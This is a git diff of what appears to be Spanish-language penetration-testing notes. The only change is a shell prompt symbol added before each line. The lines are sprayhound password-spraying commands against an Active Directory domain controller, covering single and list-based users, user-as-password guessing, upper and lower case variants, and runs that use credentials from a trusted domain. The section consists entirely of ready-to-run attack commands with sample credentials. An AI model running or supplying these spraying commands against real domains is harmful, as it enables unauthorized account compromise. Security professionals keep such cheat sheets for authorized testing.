@@ -393,40 +393,40 @@ NOTA:
 ```bash
 # Sprayhound - No autenticado
 # Single user, single password
-sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>
+❯ sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP>
 
 # User list, single password
-sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>
+❯ sprayhound -U ./users.txt -p Pentest123.. -d Domain01.local -dc <IP>
 
 # User as pass
-sprayhound -U ./users.txt -d Domain01.local -dc <IP>
+❯ sprayhound -U ./users.txt -d Domain01.local -dc <IP>
 
 # User as pass con password en minúsculas
-sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>
+❯ sprayhound -U ./users.txt --lower -d Domain01.local -dc <IP>
 
 # User as pass con password en mayúsculas
-sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
+❯ sprayhound -U ./users.txt --upper -d Domain01.local -dc <IP>
 ```
 
 ```bash
 # Sprayhound - Autenticado
 # Single user, single password
-sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+❯ sprayhound -u simba -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 
 # All domain users, single password
-sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+❯ sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 
 # All domain users, single password, usando cuenta de un dominio confiado
-sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd
+❯ sprayhound -p Pentest123.. -d Domain01.local -dc <IP> -lu 'babdcatha.net\Babd' -lp P4ssw0rd
 
 # User as pass en todos los usuarios del dominio
-sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+❯ sprayhound -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 
 # User as pass con password en minúsculas
-sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+❯ sprayhound --lower -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 
 # User as pass con password en mayúsculas
-sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
+❯ sprayhound --upper -d Domain01.local -dc <IP> -lu pixis -lp P4ssw0rd
 ```
 
 ```bash
